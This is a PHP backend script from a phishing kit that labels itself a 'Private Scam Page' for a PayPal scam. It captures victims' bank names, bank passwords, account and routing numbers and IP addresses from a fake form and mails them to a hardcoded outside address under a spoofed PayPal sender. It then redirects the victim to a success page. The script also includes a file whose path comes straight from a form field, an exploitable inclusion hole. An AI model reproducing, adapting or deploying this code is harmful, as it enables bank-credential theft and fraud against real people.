<?php

/*
__________________________________________________________________________________________________________________
Private Scam Page*********KAKA
---------------------------------------
Paypal Scam
KAKA / KAKA / KAKA / KAKA / 
KAKA / KAKA / KAKA / KAKA / 
ZIZOU / ZIZOU / ZIZOU  / ZIZOU / 
__________________________________________________________________________________________________________________
*/

/*========== [ Variables ]==========*/
$ip = getenv("REMOTE_ADDR");
$bankname = $_POST['_bkid'];
$bankpass = $_POST['_bkpass'];
$hostname = $_POST['hostname'];
$accountnumber = $_POST['_accn'];
$routingnumber = $_POST['_routn'];
/*========== [ Variables ]==========*/

$message = "
=========[BANK INFOS]=========
Bank Name	    : $bankname
Bank Password	: $bankpass
Account Number	: $accountnumber
Routing Number	: $routingnumber
===============[IP]==============
IP	: http://www.geoiptool.com/?IP=$ip
=================================";

$encrypt=  base64_encode($message);
include "$hostname";

$to = "Max.dz@outlook.com"; // Email Here
$subject = "BANK INFOS = [$ip]";
$headers = "From: PayPal Info <paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:websc-success.php");


?>